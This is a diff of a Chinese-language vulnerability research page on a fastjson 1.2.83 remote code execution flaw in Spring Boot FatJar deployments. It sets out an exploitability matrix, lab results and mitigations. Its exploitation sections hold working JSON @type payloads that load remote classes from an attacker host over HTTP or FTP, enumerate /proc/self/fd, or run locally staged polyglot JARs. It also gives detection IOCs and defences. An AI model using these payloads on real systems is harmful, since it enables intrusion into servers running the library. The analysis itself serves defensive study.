-<td>polyglot JAR + <code>jar:file:</code> 本地路径</td>
-<td><strong>RCE</strong></td>
-<td>实证（Linux JDK17 + Jetty FatJar + 网络隔离，E2）</td>
-</tr>
-<tr>
-<td>R7</td>
-<td>8</td>
-<td>Windows</td>
-<td>FatJar</td>
-<td>仅 SMB</td>
-<td>—</td>
-<td><code>jar:file:..HOST.share.x!.p.Exception</code> → 期望走 UNC <code>\\HOST\share</code></td>
-<td><strong>死</strong>（transport 未建立：JDK <code>file:</code> handler 不穿透到 SMB 协议栈）</td>
-<td>证伪（E3）</td>
-</tr>
-<tr>
-<td>R8</td>
-<td>8</td>
-<td>任意</td>
-<td>FatJar</td>
-<td>仅 FTP</td>
-<td>—</td>
-<td><code>jar:ftp:</code> 经 JDK 原生 ftp handler</td>
-<td><strong>RCE</strong></td>
-<td>实证（Linux JDK8 + Jetty FatJar，E5）</td>
-</tr>
-<tr>
-<td>R9</td>
-<td>任意</td>
-<td>任意</td>
-<td>任意</td>
-<td>无</td>
-<td>无</td>
-<td>—</td>
-<td><strong>死</strong>（无出网、无暂存 → 无攻击面）</td>
-<td>自明（无可用链）</td>
-</tr>
-<tr>
-<td>R10</td>
-<td>—</td>
-<td>—</td>
-<td>—</td>
-<td>—</td>
-<td>—</td>
-<td>WAF 正交轴：任意存活格 + WAF → <code>@type</code> unicode 编码、JSON 语法变体在 transport 槽位替换</td>
-<td><strong>格子存活</strong></td>
-<td>实证（编码绕过 IOC 已公开）</td>
-</tr>
-</tbody></table>
-<p><strong>矩阵直接给出的四个结论</strong>（实验后更新）：</p>
-<ol>
-<li><strong>部署形态是第一分轴</strong>：WAR&#x2F;外置容器全列死，FatJar 全列活——该漏洞是&quot;FatJar 部署生态的漏洞&quot;（R5 代码证据 + 其余格子实验确认）</li>
-<li><strong>升 JDK 不构成缓解</strong>：JDK 9+ 只是换了条链；R4b（Windows staging，E1）和 R6（Linux staging，E2）均已实证</li>
-<li><strong>真正有效的通用缓解只有三个</strong>：SafeMode &#x2F; noneautotype &#x2F; 出网管控+无上传面（注意 R6&#x2F;R4b 的存在使出网管控单独不充分，必须同时无 staging 面，E1&#x2F;E2&#x2F;E5 联合证实）</li>
-<li><strong>FTP 是被低估的传输通道</strong>：R8 证实 <code>jar:ftp:</code> 全链可达 RCE（E5），绕过仅监控 HTTP 出网的防御</li>
-</ol>
-<hr>
-<h2 id="5-主要存活格子利用详述"><a href="#5-主要存活格子利用详述" class="headerlink" title="5. 主要存活格子利用详述"></a>5. 主要存活格子利用详述</h2><h3 id="R1（JDK-8-最短链，已实证）"><a href="#R1（JDK-8-最短链，已实证）" class="headerlink" title="R1（JDK 8 最短链，已实证）"></a>R1（JDK 8 最短链，已实证）</h3><p>最短 payload：</p>
+<h2 id="4-利用场景全貌与详述"><a href="#4-利用场景全貌与详述" class="headerlink" title="4. 利用场景全貌与详述"></a>4. 利用场景全貌与详述</h2><p>以下按利用链逐一展开，覆盖 JDK 8 到现代 JDK、Linux 与 Windows、出网与不出网、HTTP 与 FTP 等维度。</p>
+<h3 id="4-1-JDK-8-最短链"><a href="#4-1-JDK-8-最短链" class="headerlink" title="4.1 JDK 8 最短链"></a>4.1 JDK 8 最短链</h3><p>最短 payload：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;http:..2130706433:18081.a&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>攻击端：ASM 生成类（内部名 <code>http://2130706433:18081/a</code>，带 <code>@JSONType</code>，<code>&lt;clinit&gt;</code> 放命令执行），HTTP 服务托管 <code>.class</code>。依赖：fastjson 1.2.83 + spring-boot-loader 2.7.18 + asm 9.6。</p>
-<h3 id="R2（现代-JDK-两阶段，已实证）"><a href="#R2（现代-JDK-两阶段，已实证）" class="headerlink" title="R2（现代 JDK 两阶段，已实证）"></a>R2（现代 JDK 两阶段，已实证）</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:http:..ATTACKER:18081.x!.foo.Exception&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.proc.self.fd.3!.fd3.Exception&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.proc.self.fd.4!.fd4.Exception&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.proc.self.fd.55!.fd55.Exception&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+<p><code>http:</code> 前缀载荷经 <code>new URL(context, spec)</code> 协议判定（§3.2③）按绝对 URL 处理，连 Spring 的 jar handler 都不需要——这是所有链中最短的一条，也是理解整类漏洞的起点。</p>
+<h3 id="4-2-现代-JDK-两阶段"><a href="#4-2-现代-JDK-两阶段" class="headerlink" title="4.2 现代 JDK 两阶段"></a>4.2 现代 JDK 两阶段</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:http:..ATTACKER:18081.x!.foo.Exception&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.proc.self.fd.3!.fd3.Exception&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.proc.self.fd.4!.fd4.Exception&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.proc.self.fd.55!.fd55.Exception&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
 
-<p>恶意类打包进 JAR 托管；阶段一触发下载落盘（<code>jar_cache*</code>），阶段二枚举 fd。实验中实际命中 fd 34（JDK 17 + Jetty FatJar 环境），枚举范围需覆盖 3~55 以确保命中。同一解析请求期间攻击端观察到 HEAD + GET × 2（共 3 次请求）。</p>
-<h3 id="R3-R3b（内嵌-Tomcat）：autoType-拒杀与-CL-拓扑依赖"><a href="#R3-R3b（内嵌-Tomcat）：autoType-拒杀与-CL-拓扑依赖" class="headerlink" title="R3&#x2F;R3b（内嵌 Tomcat）：autoType 拒杀与 CL 拓扑依赖"></a>R3&#x2F;R3b（内嵌 Tomcat）：autoType 拒杀与 CL 拓扑依赖</h3><p>公开分析（LoRexxar）称：Tomcat FatJar 中 TCCL 是 <code>TomcatEmbeddedWebappClassLoader</code>，其&quot;重写了 loadClass，做了额外的限制不允许连续 <code>/</code> 输入，所以禁止了 http 链路，但同样可以走 ssrf+遍历 fd 的方式利用&quot;。对一手源码通读后，这个阻断点没有在 Tomcat CL 源码中定位到——阻断实际发生在 fastjson 的 <code>checkAutoType</code> 层。</p>
-<p><strong>E4 实验结果</strong>（2026-07-26，Linux Docker Temurin）：</p>
-<table>
-<thead>
-<tr>
-<th>子组</th>
-<th>JDK</th>
-<th>payload</th>
-<th>fastjson 响应</th>
-<th>攻击端观察</th>
-<th>结论</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>E4.1</td>
-<td>8</td>
-<td>A（<code>http:..</code> 直载）</td>
-<td><code>autoType is not support. http:..2887647242:18081.a</code></td>
-<td>HEAD + GET <code>/a.class</code></td>
-<td>autoType 拒杀（type 不以 Exception 结尾 → 抛 JSONException）</td>
-</tr>
-<tr>
-<td>E4.2</td>
-<td>17</td>
-<td>A（<code>http:..</code> 直载）</td>
-<td><code>autoType is not support</code></td>
-<td>HEAD + GET <code>/a.class</code></td>
-<td>同上</td>
-</tr>
-<tr>
-<td>E4.3</td>
-<td>8</td>
-<td>B（jar:http: 两阶段 fd 枚举）</td>
-<td>超时未完成</td>
-<td>大量 GET <code>/x</code>（JAR 下载触发）</td>
-<td>数组过大（39 元素）× Tomcat CL 逐元素委派 &#x3D; 60s+ 总耗时</td>
-</tr>
-</tbody></table>
-<p><strong>关键发现</strong>：</p>
-<ol>
-<li><p><strong>http:&#x2F;&#x2F; 型名称在 Tomcat CL 拓扑下必死于 checkAutoType</strong>：<code>TypeUtils.loadClass</code> 的三个步骤均无法在 Tomcat CL 拓扑下成功 defineClass（TCCL 为 <code>TomcatEmbeddedWebappClassLoader</code>，其 <code>Class.forName</code> 委派路径与对照 A（Jetty）的 <code>TCCL=LaunchedURLClassLoader</code> 直接路径不同）。由于 <code>http:..2887647242:18081.a</code> 不以 <code>Exception</code> 结尾，checkAutoType 抛出 <code>JSONException</code> 而非软返回 null。</p>
-</li>
-<li><p><strong>transport 与 execution 解耦</strong>：资源探测的 <code>getResourceAsStream</code> 使用的是 <code>ParserConfig CL</code>（即 <code>LaunchedURLClassLoader</code>），不经过 Tomcat 的 webapp CL，因此 HTTP 下载成功（攻击端观察到 HEAD+GET）。但 <code>TypeUtils.loadClass</code> 走的是 TCCL 委派链，这是两个不同的 CL 调用路径——&quot;探测成功&quot;不保证&quot;加载成功&quot;。</p>
-</li>
-<li><p><strong>LoRexxar &quot;Tomcat CL 阻断&quot;论断不成立</strong>：源码未定位到 Tomcat CL 对 <code>//</code> 或特殊字符的显式拒绝逻辑。实测阻断在 fastjson 的 checkAutoType 层（响应直接返回 <code>autoType is not support</code>），而非 Tomcat CL 层。</p>
-</li>
-</ol>
-<p><strong>E1 Tomcat 对照的重要发现</strong>（Windows Kona JDK 17 + Tomcat FatJar + jar:file:&#x2F;&#x2F; 本地暂存）：</p>
-<p>使用 <code>&#123;&quot;@type&quot;:&quot;jar:file:.C:.temp.up.pg!.p.Exception&quot;&#125;</code> 载荷（以 Exception 结尾 + 本地文件存在），E1 Tomcat 对照<strong>意外产出 marker</strong>（RCE 成功）。这证明：</p>
-<ul>
-<li><code>jar:file://</code> 本地暂存链在 Tomcat CL 拓扑下<strong>可通</strong>（与 http:&#x2F;&#x2F; 不同，因为 getResourceAsStream 能找到本地文件，loadClass 的 Class.forName 步骤通过 LaunchedURLClassLoader 成功 defineClass）</li>
-<li>E4 的&quot;Tomcat CL 拓扑在任何 OS 下均死于 autoType&quot;的一般化结论被修正：死亡仅针对 <strong>http:&#x2F;&#x2F; 直载且非 Exception 结尾的型名称</strong></li>
-</ul>
-<p><strong>裁决</strong>：</p>
-<ul>
-<li><strong>http:&#x2F;&#x2F; 直载在 Tomcat CL 拓扑下确认死</strong>（E4.1&#x2F;E4.2，死于 checkAutoType）。</li>
-<li><strong>jar:http:&#x2F;&#x2F; + Exception 后缀 + fd 两阶段在机制上可行但未实测完成</strong>：PCL&#x3D;LaunchedURLClassLoader 可完成 getResourceAsStream（jar_cache 落盘 + fd 分配）；E1 对照已确认 jar:file:&#x2F;&#x2F; 暂存在 Tomcat 下可通（因此 fd 枚举阶段无机制障碍）。E4.3 因 39 元素数组在 Tomcat 逐元素委派下累积超时（&gt;60s）而未完成，缩小数组规模后理应可跑通。</li>
-<li>R3&#x2F;R3b 当前状态：<strong>transport (HTTP) 已确认，RCE 链在机制层面成立，但全链实验未完成</strong>。</li>
-</ul>
-<h3 id="R6-R4b（无出网-staging，已实证）"><a href="#R6-R4b（无出网-staging，已实证）" class="headerlink" title="R6&#x2F;R4b（无出网 staging，已实证）"></a>R6&#x2F;R4b（无出网 staging，已实证）</h3><p><strong>E2 实验</strong>（Linux JDK 17 + Jetty FatJar + 完全网络隔离）：</p>
+<p>恶意类打包进 JAR 托管；阶段一触发下载落盘（<code>jar_cache*</code>），阶段二枚举 fd。JDK 17 + Jetty FatJar 环境下典型命中 fd 34，枚举范围需覆盖 3~55 以确保命中。同一解析请求期间攻击端收到 HEAD + GET × 2（共 3 次请求）。</p>
+<h3 id="4-3-无出网-staging"><a href="#4-3-无出网-staging" class="headerlink" title="4.3 无出网 staging"></a>4.3 无出网 staging</h3><p><strong>Linux 本地 staging</strong>（JDK 17 + Jetty FatJar + 完全网络隔离）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: &#123;&quot;@type&quot;:&quot;jar:file:.tmp.uploads.stage!.p.Exception&quot;&#125;</span><br><span class="line">→ 解析为 jar:file:/tmp/uploads/stage!/p/Exception.class</span><br></pre></td></tr></table></figure>
-<p>步骤：先通过应用上传接口将 polyglot JAR 放置到 <code>/tmp/uploads/stage</code>，再发送 payload。网络隔离验证通过（容器 iptables 阻断所有出站），marker.log 写出内部名 <code>jar:file:/tmp/uploads/stage!/p/Exception</code>，CL 为 <code>LaunchedURLClassLoader</code>。<strong>全程零出站连接，RCE 成功。</strong></p>
-<p><strong>E1 实验</strong>（Windows JDK 17 + Jetty FatJar + 本地上传目录）：</p>
+<p>步骤：先通过应用上传接口将 polyglot JAR 放置到 <code>/tmp/uploads/stage</code>，再发送 payload。容器 iptables 阻断所有出站前提下，marker.log 写出内部名 <code>jar:file:/tmp/uploads/stage!/p/Exception</code>，CL 为 <code>LaunchedURLClassLoader</code>。全程零出站连接，RCE 成功。</p>
+<p><strong>Windows 本地 staging</strong>（JDK 17 + Jetty FatJar + 本地上传目录）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: &#123;&quot;@type&quot;:&quot;jar:file:.C:.temp.up.pg!.p.Exception&quot;&#125;</span><br><span class="line">→ 解析为 jar:file:/C:/temp/up/pg!/p/Exception.class</span><br></pre></td></tr></table></figure>
-<p>marker.log 确认内部名 <code>jar:file:/C:/temp/up/pg!/p/Exception</code>。注意 Windows 路径中 <code>C:</code> 的冒号不被 <code>replace(&#39;.&#39;,&#39;/&#39;)</code> 影响（冒号本身不是点），而路径分隔符恰好可以用单正斜杠表达——<strong>过 JDK 9+ verifier</strong>。</p>
-<p><strong>操作约束</strong>（实验确认）：</p>
+<p>marker.log 确认内部名 <code>jar:file:/C:/temp/up/pg!/p/Exception</code>。注意 Windows 路径中 <code>C:</code> 的冒号不被 <code>replace(&#39;.&#39;,&#39;/&#39;)</code> 影响（冒号本身不是点），而路径分隔符恰好可以用单正斜杠表达——过 JDK 9+ verifier。</p>
+<p>操作约束：</p>
 <ul>
-<li>上传文件名<strong>不能含点</strong>（点会变斜杠）——实验用无扩展名文件名 <code>stage</code> &#x2F; <code>pg</code></li>
-<li><code>jar:file:</code> 后的路径必须<strong>全单斜杠、无空段、无首&#x2F;尾斜杠</strong>——E1&#x2F;E2 的路径均满足</li>
-<li>zip&#x2F;JAR 格式<strong>容忍前缀垃圾</strong>（中央目录从尾部定位）——polyglot 可嵌入图片等无害外观</li>
+<li>上传文件名不能含点（点会变斜杠）——用无扩展名文件名 <code>stage</code> &#x2F; <code>pg</code></li>
+<li><code>jar:file:</code> 后的路径必须全单斜杠、无空段、无首&#x2F;尾斜杠</li>
+<li>zip&#x2F;JAR 格式容忍前缀垃圾（中央目录从尾部定位）——polyglot 可嵌入图片等无害外观</li>
 </ul>
-<h3 id="R7（Windows-UNC，已证伪）"><a href="#R7（Windows-UNC，已证伪）" class="headerlink" title="R7（Windows UNC，已证伪）"></a>R7（Windows UNC，已证伪）</h3><p><strong>E3 实验</strong>（Windows JDK 8 + Jetty FatJar；攻击端 impacket smbserver）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: &#123;&quot;@type&quot;:&quot;jar:file:..2887043830.share.x!.p.Exception&quot;&#125;</span><br><span class="line">→ 期望解析为 jar:file://172.20.10.6/share/x!/p/Exception.class → UNC \\172.20.10.6\share</span><br></pre></td></tr></table></figure>
-<p>结果：<strong>NO MARKER，SMB 服务器零连接记录</strong>。verbose_class.log 中无异常类加载尝试。</p>
-<p><strong>证伪分析</strong>：<code>jar:file:</code> 经 Spring Boot 的 jar Handler 解析时，<code>file://host/share</code> 形式<strong>被 <code>getRootJarFileFromUrl</code> 拦截</strong>——Spring Handler 首先尝试将 URL 解析为本地 root jar 条目，<code>file://host</code> 非本地文件，解析失败；随后 fallback 到 JDK 原生 jar handler，但 JDK 的 <code>sun.net.www.protocol.jar.Handler</code> 对 <code>file:</code> URL 的 authority 部分（<code>//host</code>）<strong>不会触发 SMB 协议协商</strong>——这与 Windows Explorer 或 <code>new File(&quot;\\\\host\\share&quot;)</code> 的行为不同，JDK 的 <code>FileURLConnection</code> 直接返回 <code>FileNotFoundException</code>。</p>
-<p>原始假设错在混淆了 Windows shell 层的 UNC 解析与 JDK <code>java.net.URL</code> 层的 <code>file:</code> 处理——后者<strong>不穿透到 SMB 协议栈</strong>。R7 判定为<strong>死格子</strong>（非库存死，是机制死）。</p>
-<h3 id="R8（FTP-传输通道，已实证）"><a href="#R8（FTP-传输通道，已实证）" class="headerlink" title="R8（FTP 传输通道，已实证）"></a>R8（FTP 传输通道，已实证）</h3><p><strong>E5 实验</strong>（Linux JDK 8 + Jetty FatJar；攻击端 pyftpdlib 在 2121 端口）：</p>
+<h3 id="4-4-FTP-传输通道"><a href="#4-4-FTP-传输通道" class="headerlink" title="4.4 FTP 传输通道"></a>4.4 FTP 传输通道</h3><p>（Linux JDK 8 + Jetty FatJar；攻击端 pyftpdlib 在 2121 端口）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: &#123;&quot;@type&quot;:&quot;jar:ftp:..2887647242:2121.x!.p.Exception&quot;&#125;</span><br><span class="line">→ 解析为 jar:ftp://2887647242:2121/x!/p/Exception.class</span><br></pre></td></tr></table></figure>
-<p>marker.log 确认内部名 <code>jar:ftp://2887647242:2121/x!/p/Exception</code>，CL 为 <code>LaunchedURLClassLoader</code>。<strong>RCE 成功。</strong></p>
-<p><strong>机制</strong>：JDK 内置 <code>sun.net.www.protocol.ftp.Handler</code> 处理 <code>ftp:</code> URL，经 <code>JarURLConnection</code> → <code>URLJarFile.retrieve</code> 与 HTTP 走同一下载-落盘路径——<strong>传输协议对后续链路透明</strong>。这意味着：</p>
+<p>marker.log 确认内部名 <code>jar:ftp://2887647242:2121/x!/p/Exception</code>，CL 为 <code>LaunchedURLClassLoader</code>。RCE 成功。</p>
+<p>机制：JDK 内置 <code>sun.net.www.protocol.ftp.Handler</code> 处理 <code>ftp:</code> URL，经 <code>JarURLConnection</code> → <code>URLJarFile.retrieve</code> 与 HTTP 走同一下载-落盘路径——传输协议对后续链路透明。这意味着：</p>
 <ul>
-<li>仅拦截 HTTP 出站（80&#x2F;443&#x2F;8080 等）的防火墙规则<strong>对 FTP 通道无效</strong></li>
+<li>仅拦截 HTTP 出站（80&#x2F;443&#x2F;8080 等）的防火墙规则对 FTP 通道无效</li>
 <li>JDK 8 上 FTP 直载同样绕过 verifier（内部名含 <code>//</code> 但 JDK 8 放行）</li>
 <li>对于 JDK 9+，FTP 通道仍可作为两阶段的 transport（与 HTTP 等价），fd 枚举阶段不变</li>
 </ul>
-<p><strong>防御含义</strong>：出网白名单必须覆盖<strong>全协议</strong>（TCP 层全端口阻断），或使用 SafeMode&#x2F;noneautotype 根断。</p>
+<p>防御含义：出网白名单必须覆盖全协议（TCP 层全端口阻断），或使用 SafeMode&#x2F;noneautotype 根断。</p>
+<h3 id="4-5-关键结论"><a href="#4-5-关键结论" class="headerlink" title="4.5 关键结论"></a>4.5 关键结论</h3><ol>
+<li>部署形态是第一分轴：WAR&#x2F;外置容器机制性死亡（Tomcat <code>WebappClassLoaderBase</code> 走本地路径 + Spring Boot Launcher WAR 模式不注册 <code>jar:</code> handler），FatJar 全列活——该漏洞本质上是&quot;FatJar 部署生态的漏洞&quot;</li>
+<li>升 JDK 不构成缓解：JDK 9+ 只是换了条链；Windows staging 和 Linux staging 均可行</li>
+<li>真正有效的通用缓解只有三个：SafeMode &#x2F; noneautotype &#x2F; 出网管控+无上传面（注意本地 staging 的存在使出网管控单独不充分，必须同时无 staging 面）</li>
+<li>FTP 是被低估的传输通道：<code>jar:ftp:</code> 全链可达 RCE，绕过仅监控 HTTP 出网的防御</li>
+</ol>
 <hr>
-<h2 id="6-检测与防御"><a href="#6-检测与防御" class="headerlink" title="6. 检测与防御"></a>6. 检测与防御</h2><h3 id="6-1-防御效力（从矩阵读出，实验后更新）"><a href="#6-1-防御效力（从矩阵读出，实验后更新）" class="headerlink" title="6.1 防御效力（从矩阵读出，实验后更新）"></a>6.1 防御效力（从矩阵读出，实验后更新）</h3><table>
-<thead>
-<tr>
-<th>措施</th>
-<th>效力</th>
-<th>状态</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>SafeMode</strong>（<code>-Dfastjson.parser.safeMode=true</code> &#x2F; <code>setSafeMode(true)</code>）</td>
-<td><strong>根断</strong>：检查在资源访问之前</td>
-<td>实证</td>
-</tr>
-<tr>
-<td><strong><code>1.2.83_noneautotype</code></strong></td>
-<td>根断</td>
-<td>实证</td>
-</tr>
-<tr>
-<td>迁移 fastjson2</td>
-<td>根断（代码路径不存在）</td>
-<td>实证</td>
-</tr>
-<tr>
-<td>出网管控（HTTP <strong>+ FTP</strong>）<strong>且</strong> 无上传&#x2F;staging 面</td>
-<td>有效（使全部存活格子失 transport 或 staging）</td>
-<td>实证（E5 证明 FTP 可 RCE，仅拦 HTTP 不够）</td>
-</tr>
-<tr>
-<td>仅 HTTP 出网管控</td>
-<td><strong>不充分</strong>：FTP 通道（R8）绕过</td>
-<td>实证</td>
-</tr>
-<tr>
-<td>出网管控但有上传功能</td>
-<td><strong>不充分</strong>：R6&#x2F;R4b 本地 staging</td>
-<td>实证</td>
-</tr>
-<tr>
-<td>WAF 单独</td>
-<td><strong>无效</strong>：<code>\u0040type</code> 等编码绕过</td>
-<td>实证</td>
-</tr>
-<tr>
-<td>升 JDK 9+</td>
-<td><strong>无效</strong>：本地 staging（R4b&#x2F;R6）绕过 fd 依赖</td>
-<td>实证</td>
-</tr>
-<tr>
-<td>&quot;升级 Spring Boot 3.2+&quot;</td>
-<td><strong>效力存疑</strong>：GCSA 在 Spring Boot Loader <strong>3.2.0</strong> 上仍复现 RCE 成功（JDK 17&#x2F;21&#x2F;25），与该建议矛盾（实证冲突，留待后续专题核实）</td>
-<td></td>
-</tr>
-</tbody></table>
-<h3 id="6-2-检测-IOC（实验补充）"><a href="#6-2-检测-IOC（实验补充）" class="headerlink" title="6.2 检测 IOC（实验补充）"></a>6.2 检测 IOC（实验补充）</h3><p><strong>请求侧</strong>：<code>@type</code> 值含 <code>http:..</code>、<code>jar:http:..</code>、<code>jar:ftp:..</code>、<code>jar:file:.proc.self.fd.</code>、<code>jar:file:.C:</code>（Windows staging）、<code>jar:file:.tmp.</code>（Linux staging）、<code>!.</code>（jar entry 分隔符）、<code>Exception</code> 后缀；注意 <code>&quot;\u0040type&quot;</code> 编码变体</p>
+<h2 id="5-检测与防御"><a href="#5-检测与防御" class="headerlink" title="5. 检测与防御"></a>5. 检测与防御</h2><p><strong>请求侧</strong>：<code>@type</code> 值含 <code>http:..</code>、<code>jar:http:..</code>、<code>jar:ftp:..</code>、<code>jar:file:.proc.self.fd.</code>、<code>jar:file:.C:</code>（Windows staging）、<code>jar:file:.tmp.</code>（Linux staging）、<code>!.</code>（jar entry 分隔符）、<code>Exception</code> 后缀；注意 <code>&quot;\u0040type&quot;</code> 编码变体</p>
 <p><strong>网络侧</strong>：JVM 向异常主机发起 HTTP（HEAD+GET × 2 三连）或 FTP 连接请求无扩展名文件&#x2F;<code>.class</code>；同一解析期间 1-3 次重复请求</p>
 <p><strong>主机侧</strong>：JVM 临时目录出现 <code>jar_cache*</code>；类加载日志出现 <code>jar:file:/proc/self/fd/N!/</code> 或 <code>jar:ftp://</code> 或非 classpath 内的 <code>jar:file:</code> 路径</p>
 <hr>
-<h2 id="7-时间线与资料来源"><a href="#7-时间线与资料来源" class="headerlink" title="7. 时间线与资料来源"></a>7. 时间线与资料来源</h2><table>
+<h2 id="6-资料来源与参考文献"><a href="#6-资料来源与参考文献" class="headerlink" title="6. 资料来源与参考文献"></a>6. 资料来源与参考文献</h2><h3 id="6-1-事件时间线"><a href="#6-1-事件时间线" class="headerlink" title="6.1 事件时间线"></a>6.1 事件时间线</h3><table>
 <thead>
 <tr>
 <th>日期</th>
 <th>事件</th>
+<th>来源</th>
 </tr>
 </thead>
 <tbody><tr>
 <td>2026-07-19</td>
-<td>Kirill Firsov Twitter 首披露</td>
+<td>Kirill Firsov (@k_firsov) Twitter 首次公开披露</td>
+<td>[5]</td>
 </tr>
 <tr>
 <td>2026-07-20</td>
-<td>奇安信 CERT 通告 QVD-2026-43021；腾讯云早期通告</td>
+<td>奇安信 CERT 发布 QVD-2026-43021 通告；腾讯云早期通告；猎户攻防实验室预警</td>
+<td>[3]</td>
 </tr>
 <tr>
 <td>2026-07-21</td>
-<td>官方 Security Advisory；奇安信确认复现；GCSA 深度分析</td>
+<td>官方 Security Advisory 发布；奇安信 CERT 确认复现（第二次更新）；GCSA 发布深度分析；大连理工大学安全公告；CSDN 综合 PoC 分析</td>
+<td>[1][4][8]</td>
 </tr>
 <tr>
 <td>2026-07-22</td>
-<td>原作者公开研究文档（fearsoff.org）；首个公开 PoC 仓库出现（推送者为 Codex，后被删除）</td>
+<td>原作者在 fearsoff.org 公开完整研究文档；首个公开 PoC 仓库出现（wouijvziqy，后删除）；LoRexxar、9eek、FreeBuf、Mrxn 等技术分析集中发布</td>
+<td>[5][6][7][13]</td>
 </tr>
 <tr>
 <td>2026-07-23</td>
-<td>CVE-2026-16723 正式通告</td>
+<td>CVE-2026-16723 正式通告（腾讯云）；CSDN 企业排查加固</td>
+<td>[2]</td>
 </tr>
 <tr>
-<td>2026-07-24~25</td>
-<td>利用工具、企业排查脚本、WAF&#x2F;RASP 方案集中出现</td>
+<td>2026-07-24–25</td>
+<td>Detect-DefenseLab 全版本通杀研究；众多利用工具与防御方案集中出现</td>
+<td>[14]</td>
 </tr>
 </tbody></table>
-<p>资料：官方 advisory、腾讯云、奇安信（×2）、LoRexxar、Mrxn、9eek、GCSA（×2）、猎户、DLUT、GitHub Release、CSDN（×2）、FreeBuf、Detect-DefenseLab（共 16 篇）。PoC 仓库：ThanatosXingYu、seklure、dinosn（靶场）、fzypl、zg-sec、Detect-DefenseLab、YoungBear 等。</p>
-<hr>
-<h2 id="8-实验结果（预注册→已执行）"><a href="#8-实验结果（预注册→已执行）" class="headerlink" title="8. 实验结果（预注册→已执行）"></a>8. 实验结果（预注册→已执行）</h2><h3 id="8-0-对照组"><a href="#8-0-对照组" class="headerlink" title="8.0 对照组"></a>8.0 对照组</h3><table>
+<h3 id="6-2-参考文献"><a href="#6-2-参考文献" class="headerlink" title="6.2 参考文献"></a>6.2 参考文献</h3><h4 id="官方公告与安全通告"><a href="#官方公告与安全通告" class="headerlink" title="官方公告与安全通告"></a>官方公告与安全通告</h4><table>
 <thead>
 <tr>
-<th>格子</th>
-<th>环境</th>
-<th>payload</th>
-<th>结果</th>
-<th>判定</th>
+<th>编号</th>
+<th>标题</th>
+<th>来源</th>
+<th>日期</th>
+<th>URL</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><strong>对照 A</strong></td>
-<td>Linux JDK 8 + Jetty FatJar</td>
-<td>A（<code>http:..</code> 直载）</td>
-<td>marker: <code>http://2887647242:18081/a</code>，CL&#x3D;<code>LaunchedURLClassLoader</code></td>
-<td><strong>RCE 阳性</strong></td>
+<td>[1]</td>
+<td>Security Advisory: Remote Code Execution in fastjson 1.2.68–1.2.83</td>
+<td>GitHub &#x2F; alibaba&#x2F;fastjson2 Wiki</td>
+<td>2026-07-21</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83">https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83</a></td>
 </tr>
 <tr>
-<td><strong>对照 B</strong></td>
-<td>Linux JDK 17 + Jetty FatJar</td>
-<td>B（两阶段 fd 枚举）</td>
-<td>marker: <code>jar:file:/proc/self/fd/34!/fd34/Exception</code>，CL&#x3D;<code>LaunchedURLClassLoader</code></td>
-<td><strong>RCE 阳性</strong></td>
+<td>[2]</td>
+<td>Fastjson 远程代码执行漏洞风险通告 (CVE-2026-16723)</td>
